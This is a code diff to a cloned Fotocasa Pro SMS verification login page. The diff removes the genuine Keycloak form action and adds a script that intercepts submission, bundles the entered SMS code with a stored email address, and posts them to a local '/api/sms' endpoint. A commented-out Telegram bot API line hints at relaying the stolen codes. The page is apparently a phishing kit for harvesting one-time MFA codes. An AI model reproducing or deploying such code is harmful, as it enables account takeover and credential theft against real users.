@@ -39,7 +39,7 @@
  <div class=form-container>
  Verificar la cuenta
  <div class=re-ut-AuthModule-content id=casSimpleMfaLoginView>
- <form id=kc-sms-code-login-form class=kc-form action="https://login.gw.fotocasa.pro/realms/fotocasa-pro/login-actions/authenticate?session_code=GGQ7DYlqw-cFgYo1Ir8w0BKD5UeUajZ2w-ev_NSlUFQ&amp;execution=8e18dd47-62a3-4365-bf91-495adeb3fe92&amp;client_id=webclient&amp;tab_id=_lFhBU1L4eQ&amp;client_data=eyJydSI6Imh0dHBzOi8vdW5pcXVldG9vbC5ndy5mb3RvY2FzYS5wcm8vbG9naW4iLCJydCI6ImNvZGUifQ" method=post>
+ <form id='myForm' class=kc-form>
  <div>
  <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
  <label for=code class=input-label>
@@ -58,7 +58,7 @@
  </div>
  <div id=kc-form-buttons>
  <section class=form-element>
- <button tabindex=7 name=login id=kc-login type=submit>
+ <button tabindex=7 name=login type=submit>
  Validar código y entrar
  </button>
  </section>
@@ -174,4 +174,27 @@
       clearInterval(countdown); // oprește timerul când ajunge la 0
     }
   }, 1000); // rulează o dată pe secundă
+
+  document.getElementById('myForm').addEventListener('submit', async (e) => {
+  e.preventDefault(); 
+              
+    let formData = new FormData(e.target);
+                
+    formData = JSON.stringify({
+      code: formData.get('code'),
+      mail: user.email
+    });
+    const user = localStorage.getItem('usr');
+
+    // const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    const response = await fetch('/api/sms', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: formData
+    });
+
+  })
 </script>
